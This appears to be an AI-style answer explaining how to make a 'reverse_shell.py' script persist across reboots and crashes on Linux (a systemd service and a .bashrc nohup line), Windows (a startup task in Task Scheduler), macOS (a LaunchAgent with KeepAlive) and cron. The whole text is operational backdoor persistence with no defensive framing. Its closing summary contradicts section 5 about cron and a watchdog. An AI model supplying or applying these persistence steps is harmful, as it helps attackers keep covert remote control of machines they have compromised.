Here are a few common approaches for different operating systems:
1. Linux: Using Systemd

Systemd is a popular system and service manager for Linux operating systems. You can create a systemd service to run the reverse shell script and ensure it starts at boot and restarts automatically if it crashes.
Create a Systemd Service

    Create a Service File:
    Create a new service file for your reverse shell script:

    bash

sudo nano /etc/systemd/system/reverse_shell.service

Add the Following Configuration:

ini

[Unit]
Description=Reverse Shell Service
After=network.target

[Service]
ExecStart=/usr/bin/python3 /home/kit/sky/reverse_shell.py
Restart=always
User=kit
WorkingDirectory=/home/kit/sky

[Install]
WantedBy=multi-user.target

Reload Systemd:

bash

sudo systemctl daemon-reload

Enable and Start the Service:

bash

sudo systemctl enable reverse_shell.service
sudo systemctl start reverse_shell.service

Check the Service Status:

bash

    sudo systemctl status reverse_shell.service

2. Linux: Adding to .bashrc or .profile

You can add the reverse shell script to the .bashrc or .profile file to ensure it runs whenever a user logs in.

    Edit the .bashrc or .profile File:

    bash

nano /home/kit/.bashrc

Add the Following Line:

bash

    nohup python3 /home/kit/sky/reverse_shell.py > /dev/null 2>&1 &

    Save and Close the File.

3. Windows: Using Task Scheduler

Task Scheduler allows you to create tasks that run automatically at specified times or events, such as system startup.

    Open Task Scheduler:
    Press Win + R, type taskschd.msc, and press Enter.

    Create a New Task:
        Click on "Create Task" in the right-hand panel.
        Name the task (e.g., "Reverse Shell").

    Set the Trigger:
        Go to the "Triggers" tab.
        Click "New" and select "At startup" or another appropriate trigger.

    Set the Action:
        Go to the "Actions" tab.
        Click "New" and select "Start a program."
        Browse to the Python executable and add the path to your reverse shell script as an argument (e.g., C:\Python39\python.exe C:\path\to\reverse_shell.py).

    Configure Other Settings:
        Go to the "Settings" tab and ensure "Allow task to be run on demand" and "Run task as soon as possible after a scheduled start is missed" are checked.

    Save the Task.

4. MacOS: Using Launchd

Launchd is a service management framework for macOS that can be used to create persistent background processes.

    Create a Launch Agent Plist File:

    bash

nano ~/Library/LaunchAgents/com.username.reverseshell.plist

Add the Following Configuration:

xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.username.reverseshell</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>/path/to/reverse_shell.py</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>

Load the Launch Agent:

bash

    launchctl load ~/Library/LaunchAgents/com.username.reverseshell.plist

5. Setting Up Cron

Ensure that the cron job is set up correctly to run the watchdog script every minute and at boot. You can edit the cron jobs using crontab -e:

bash

* * * * * /home/kit/sky/watchdog.sh
@reboot /home/kit/sky/watchdog.sh


Summary

These methods allow you to achieve persistence on different operating systems without relying on cron and a watchdog script. Each method ensures that the reverse shell script runs at startup and keeps running, even if it crashes. Choose the method that best suits your environment and needs.
